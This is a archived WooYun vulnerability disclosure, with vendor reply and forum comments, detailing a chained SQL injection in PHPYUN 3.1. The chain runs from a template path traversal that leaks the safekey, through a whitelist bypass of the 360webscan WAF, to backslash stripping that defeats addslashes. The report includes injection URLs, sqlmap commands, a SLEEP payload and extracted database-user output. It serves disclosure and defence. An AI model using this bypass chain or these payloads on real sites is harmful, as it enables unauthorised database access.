{"id": 404, "wybug_id": "wooyun-2014-070126", "wybug_title": "一步步击溃PHPYUN（另类方法绕过防注入）", "wybug_corp": "php云人才系统", "wybug_author": "猪头子", "wybug_date": "2014-07-29 14:39", "wybug_open_date": "2014-10-27 14:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-27：\t细节向公众公开  简要描述： 由某处SQL注入引起，最终通过组合漏洞击溃PHPYUN 详细说明：  测试版本：PHPYUN 3.1 GBK beta 20140728PHPYUN使用了两套waf，一套自己写的，一套360的，从第一套开始。\\data\\db.safety.php:\nquotesGPC(); // 效果：addslashesif($config['sy_istemplate']!='1' || md5(md5($config['sy_safekey']).$_GET['m'])!=$_POST['safekey']){\tforeach($_POST  as $id=>$v){\t\tsafesql($id,$v,\"POST\",$config);\t\t$id = sfkeyword($id,$config);\t\t$v = sfkeyword($v,$config);\t\t$_POST[$id]=common_htmlspecialchars($v);\t}}foreach($_GET  as $id=>$v){\t\tsafesql($id,$v,\"GET\",$config);\t$id = sfkeyword($id,$config);\t$v = sfkeyword($v,$config);\tif(!is_array($v))\t$v=substr(strip_tags($v),0,80);\t$_GET[$id]=common_htmlspecialchars($v);}foreach($_COOKIE  as $id=>$v){\t\tsafesql($id,$v,\"COOKIE\",$config);\t$id = sfkeyword($id,$config);\t$v = sfkeyword($v,$config);\t$v=substr(strip_tags($v),0,52);\t$_COOKIE[$id]=common_htmlspecialchars($v);}\n首先通过quotesGPC()对输入进行addslashes，然后分别对$_GET/$_POST/$_COOKIE做同样的过滤（$_POST为例）：\nsafesql($id,$v,\"POST\",$config);$id = sfkeyword($id,$config);$v = sfkeyword($v,$config);$_POST[$id]=common_htmlspecialchars($v);\n但对$_POST做过滤时多了一个判断：\nif($config['sy_istemplate']!='1' || md5(md5($config['sy_safekey']).$_GET['m'])!=$_POST['safekey']){\tforeach($_POST  as $id=>$v){\t\tsafesql($id,$v,\"POST\",$config);\t\t$id = sfkeyword($id,$config);\t\t$v = sfkeyword($v,$config);\t\t$_POST[$id]=common_htmlspecialchars($v);\t}}\n当判断为真时进行过滤，为假则不过滤，而判断中的两个条件：\n$config['sy_istemplate']!='1' || md5(md5($config['sy_safekey']).$_GET['m'])!=$_POST['safekey']\n默认$config['sy_istemplate']=1，因此只要第二个条件为false就可以跳过对$_POST参数的过滤。而第二个条件最关键的参数$config['sy_safekey']未知，它是在安装时随机生成的：\\install\\index.php\n$r=rand(10000000,99999999);mysql_query(\"update $table_config set `config`='$r' where `name`='sy_safekey'\");\n懒得穷举，可不可以用更优雅的方法拿到safekey?搜索一下，看看有没有可能从其他地方泄露这个值，结果发现了好玩的东西：\\templates_c\\%%8F^8F9^8F951B06%%admin_web_config.htm.php\n<tr>        <th width=\"160\">系统安全码：</th>        <td><input class=\"input-text tips_class\" type=\"text\" name=\"sy_safekey\" id=\"sy_safekey\" value=\"<?php echo $this->_tpl_vars['config']['sy_safekey']; ?>\" size=\"40\" maxlength=\"255\"/><font color=\"gray\" style=\"display:none\">系统部分功能使用的加密串，请自定义修改，如：986jhgyutw.*x</font></td>        <td width=\"160\">sy_safekey</td>    </tr>\n此处模板里会输出safekey，但是如果直接访问这个模板的话，会因为$this未定义而报错。按照模板编译的风格，这个命名方式的模板应该是编译后的模板，来找到其对应的编译前模板：\\template\\admin\\admin_web_config.htm\n<tr>        <th width=\"160\">系统安全码：</th>        <td><input class=\"input-text tips_class\" type=\"text\" name=\"sy_safekey\" id=\"sy_safekey\" value=\"{yun:}$config.sy_safekey{/yun}\" size=\"40\" maxlength=\"255\"/><font color=\"gray\" style=\"display:none\">系统部分功能使用的加密串，请自定义修改，如：986jhgyutw.*x</font></td>        <td width=\"160\">sy_safekey</td>    </tr>\n如果能让PHPYUN编译这个模板，拿到输出，safekey就到手了，因此需要找到可控的编译点：\\company\\model\\index.class.php：\nfunction index_action(){    if($this->uid!=$_GET['id']&&$_COOKIE['usertype']=='1'){       ... ... ...    }    if($_POST['submit'])    {        ... ... ...    }    if($_POST['submit2'])    {       ... ... ...    }    ... ... ...    $tp=$_GET['tp']?$_GET['tp']:\"index\";    $this->seo(\"company_\".$tp);    $this->yunset(\"com_style\",$this->config['sy_weburl'].\"/template/company/\".$tplurl.\"/\");    $this->yunset(\"comstyle\",\"../template/company/\".$tplurl.\"/\");    $this->yunset(\"defaultstyle\",\"../template/default/\");    $this->yuntpl(array('company/'.$tplurl.\"/\".$tp));}\n在这里$_GET['tp']被传入到$tp然后进入$this->yuntpl(array('company/'.$tplurl.\"/\".$tp))，yuntpl函数的主要作用是加载模板并编译输出它，所以只要控制$_GET['tp']为../../admin/admin_web_config就可以编译想要的模板了，试试：\n\n官方demo试试：\n\n看到可爱的safekey了。拿到safekey后，就能让前面判断的第二个条件为false，因此第一个waf就跳过了。来到第二个waf，360的webscan：\nif(is_file(LIB_PATH.'webscan360/360safe/360webscan.php')){    require_once(LIB_PATH.'webscan360/360safe/360webscan.php');}\n在360webscan.php中还有又一轮的过滤： \\include\\webscan360\\360safe\\360webscan.php\n//get拦截规则$getfilter = \"<[^>]*?=[^>]*?&#[^>]*?>|\\\\b(alert\\\\(|confirm\\\\(|expression\\\\(|prompt\\\\()|<[^>]*?\\\\b(onerror|onmousemove|onload|onclick|onmouseover)\\\\b[^>]*?>|^\\\\+\\\\/v(8|9)|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|>|<|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";//post拦截规则$postfilter = \"<[^>]*?=[^>]*?&#[^>]*?>|\\\\b(alert\\\\(|confirm\\\\(|expression\\\\(|prompt\\\\()|<[^>]*?\\\\b(onerror|onmousemove|onload|onclick|onmouseover)\\\\b[^>]*?>|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|>|<|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";//cookie拦截规则$cookiefilter = \"\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|>|<|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";\n这些正则会被用在：\nif ($webscan_switch&&webscan_white($webscan_white_directory,$webscan_white_url)) {  if ($webscan_get) {    foreach($_GET as $key=>$value) {      webscan_StopAttack($key,$value,$getfilter,\"GET\"); // 对GET进行过滤    }  }  if ($webscan_post) {    foreach($_POST as $key=>$value) {      webscan_StopAttack($key,$value,$postfilter,\"POST\"); // 对POST进行过滤    }  }  if ($webscan_cookie) {    foreach($_COOKIE as $key=>$value) {      webscan_StopAttack($key,$value,$cookiefilter,\"COOKIE\"); // 对COOKIE进行过滤    }  }  if ($webscan_referre) {    foreach($webscan_referer as $key=>$value) {      webscan_StopAttack($key,$value,$postfilter,\"REFERRER\"); // 对REFERER头进行过滤    }  }}\n而检测点的第一个if判断是可以跳过的：\nif ($webscan_switch&&webscan_white($webscan_white_directory,$webscan_white_url)) {\n$webscan_switch默认是1.webscan_white($webscan_white_directory,$webscan_white_url)用来检查当前URL请求在不在白名单范围中，存在的话就不检查： \\include\\webscan360\\360safe\\360webscan.php:215\n/** *  拦截目录白名单 */function webscan_white($webscan_white_name,$webscan_white_url=array()) {  $url_path=$_SERVER['PHP_SELF'];  $url_var=$_SERVER['QUERY_STRING'];  if (preg_match(\"/\".$webscan_white_name.\"/is\",$url_path)==1) {    return false;  }  foreach ($webscan_white_url as $key => $value) {    if(!empty($url_var)&&!empty($value)){      if (stristr($url_path,$key)&&stristr($url_var,$value)) {        return false;      }    }    elseif (empty($url_var)&&empty($value)) {      if (stristr($url_path,$key)) {        return false;      }    }  }  return true;}\nwebscan_white先判断请求url是否在白名单里，接下来判断请求的参数对是否在白名单里，白名单：\n//后台白名单,后台操作将不会拦截,添加\"|\"隔开白名单目录下面默认是网址带 admin  /dede/ 放行$webscan_white_directory='admin|\\/dede\\/|\\/install\\/';//url白名单,可以自定义添加url白名单,默认是对phpcms的后台url放行//写法：比如phpcms 后台操作url index.php?m=admin php168的文章提交链接post.php?job=postnew&step=post ,dedecms 空间设置edit_space_info.php$webscan_white_url = array('index.php' => 'admin_dir=admin','post.php' => 'job=postnew&step=post','edit_space_info.php'=>'');\n这个白名单检测知道怎么绕过的人应该很多，只要让传入参数存在白名单目录或参数即可。 比如利用白名单目录： http://www.target.com/index.php/dede/?m=foo&c=bar&id=1' and 1=2 union select xxx 由于请求中包含了白名单目录/dede/，所以放行。 利用白名单参数： http://www.target.com/index.php?m=foo&c=bar&admin_dir=admin&id=1' and 1=2 union select xxx 同理，请求中包含了白名单参数所以放行。 绕过360waf后，接下来就进入程序逻辑，没有什么需要绕的了。虽然绕了两个waf，但是还有一个quotesGPC()函数是生效的，quotesGPC()的作用：\nfunction quotesGPC() {\tif(!get_magic_quotes_gpc()){\t \t$_POST = array_map(\"addSlash\", $_POST);\t\t$_GET = array_map(\"addSlash\", $_GET);\t\t$_COOKIE = array_map(\"addSlash\", $_COOKIE);\t}}function addSlash($el) {\tif (is_array($el))\t\treturn array_map(\"addSlash\", $el);\telse\t\treturn addslashes($el);}\n等同于一个addslashes_deep，想要绕过这个得结合具体漏洞点：\\wap\\model\\login.class.php:30\nfunction index_action(){    $this->get_moblie(); // 通过UA判断是否是手机端    if($this->uid || $this->username)    {        $this->wapheader('member/index.php'); //登陆用户跳转    }    if($_POST['submit'])    {        if($_POST['wxid'])        {            $wxparse = '&wxid='.$_POST['wxid'];        }        $usertype=$_POST['usertype']?intval($_POST['usertype']):1;        $username = str_replace('\\\\','',$_POST['username']); // 漏洞点：过滤\\        if($usertype>0 && $username!='')        {            $userinfo = $this->obj->DB_select_once(\"member\",\"`username`='\".str_replace('\\\\','',$_POST['username']).\"' and usertype='\".$usertype.\"'\",\"username,usertype,password,uid,salt\");    ... ... ...\n由于str_replace('\\\\','',$_POST['username']);过滤了\\，直接导致quotesGPC函数失效。quotesGPC失效，单引号就可逃脱safekey拿到，第一套过滤就可绕过360webscan用白名单绕过所以该处注入漏洞存在并无视防御   漏洞证明：  参数username为注册的用户名，参数usertype为注册的用户类型，然后用之前的方法获得safekey后，使用SQLMAP：\nroot@kali:/usr/share/sqlmap/tamper# sqlmap -u \"http://192.168.254.136/phpyun/728/wap/index.php?m=login&c=index&admin_dir=admin\" --data=\"submit=1&wxid=1&usertype=2&username=just4fun&safekey=53b6ad0cc21db28388507743269aa19d\" --threads=10 --dbms=mysql -p username --risk=5 --level=3 --user-agent=iphone --flush-session... ...... ...POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 823 HTTP(s) requests:---Place: POSTParameter: username    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: submit=1&wxid=1&usertype=2&username=just4fun' AND SLEEP(5) AND 'MPUx'='MPUx&safekey=53b6ad0cc21db28388507743269aa19d---[01:04:39] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.13, Apache 2.2.22back-end DBMS: MySQL 5.0.11[01:04:39] [INFO] fetched data logged to text files under './output/192.168.254.136'[*] shutting down at 01:04:39\n当前用户：\nroot@kali:/usr/share/sqlmap/tamper# sqlmap -u \"http://192.168.254.136/phpyun/728/wap/index.php?m=login&c=index&admin_dir=admin\" --data=\"submit=1&wxid=1&usertype=2&username=just4fun&safekey=53b6ad0cc21db28388507743269aa19d\" --threads=10 --dbms=mysql -p username --risk=5 --level=3 --user-agent=iphone --current-user    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 01:09:14[01:09:14] [WARNING] provided parameter 'username' is not inside the GET[01:09:14] [INFO] testing connection to the target urlsqlmap got a 302 redirect to 'http://192.168.254.136:80/phpyun/728/wap/index.php'. Do you want to follow? [Y/n] nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: username    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: submit=1&wxid=1&usertype=2&username=just4fun' AND SLEEP(5) AND 'MPUx'='MPUx&safekey=53b6ad0cc21db28388507743269aa19d---[01:09:15] [INFO] testing MySQL[01:09:15] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] n[01:09:25] [INFO] confirming MySQL[01:09:25] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based payloads[01:09:35] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.13, Apache 2.2.22back-end DBMS: MySQL >= 5.0.0[01:09:35] [INFO] fetching current user[01:09:35] [WARNING] multi-threading is considered unsafe in time-based data retrieval. Going to switch it off automatically[01:09:35] [INFO] retrieved: root@localhostcurrent user:    'root@localhost'[01:14:57] [INFO] fetched data logged to text files under './output/192.168.254.136'[*] shutting down at 01:14:57root@kali:/usr/share/sqlmap/tamper#\n   修复方案：  1、修复泄露safekey的问题2、修复360webscan被绕过问题3、修复注入   版权声明：转载请注明来源 猪头子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-07-29 14:57 厂商回复： 感谢您的提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-29 14:54 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  淫荡流    \n     2014-07-29 14:55 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  关注下，看看ztz究竟有多淫荡..    \n     2014-07-29 14:55 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  都开始玩组合拳了    \n     2014-07-29 14:57 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @Finger 他于 2011-07-14 注册，已来到乌云 1111 天 注定孤独一生吗?    \n     2014-07-29 15:06 |    \t\tXser \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:61        | JDSec)\t\t \n  @′ 雨。 我同学生日11月11日--    \n     2014-07-29 15:07 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @′  雨。 ...    \n     2014-07-29 15:08 |    \t\t小新 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:19        | 我可是要成为普通白帽子的小新)\t\t \n  最近频繁放漏洞啊    \n     2014-07-29 15:14 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  @小新 再不放就捂烂了    \n     2014-07-29 17:17 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  @小新 @猪头子 ~组合技啊    \n     2014-08-01 20:48 |    \t\t小庄 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        )\t\t \n  怎么看不到内容啊~    \n     2014-08-18 16:22 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  谢谢ztz大牛没走通用性让我们提前拜读    \n     2014-08-19 10:57 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  nice!    \n     2014-08-20 11:36 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  都是那么牛逼的    \n     2014-08-20 20:27 |    \t\t飞扬风 \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:125        | 追求安全，热爱技术)\t\t \n  确实漂亮~    \n     2014-09-16 12:30 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  ztz师傅我要给你生鸽子    \n     2014-10-27 14:48 |    \t\t老笨蛋 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 老笨蛋一个)\t\t \n  思路真的好强大。    \n     2014-10-27 15:42 |    \t\t皂皂 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | a hacker and painter)\t\t \n  师傅好厉害哦    \n     2014-10-27 18:02 |    \t\t小新 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:19        | 我可是要成为普通白帽子的小新)\t\t \n  那个discuz的getshell快被你捂烂了    \n     2014-10-27 19:51 |    \t\tSunshine \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:10        | Nothing.)\t\t \n  大牛好久不见了哈    \n     2014-10-27 21:00 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  分析的好    \n     2014-10-27 21:08 |    \t\t醉青丝 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | null)\t\t \n  厉害    \n     2014-10-30 16:28 |    \t\tStranger \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 我注意你很久了.....)\t\t \n  哇哦....    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}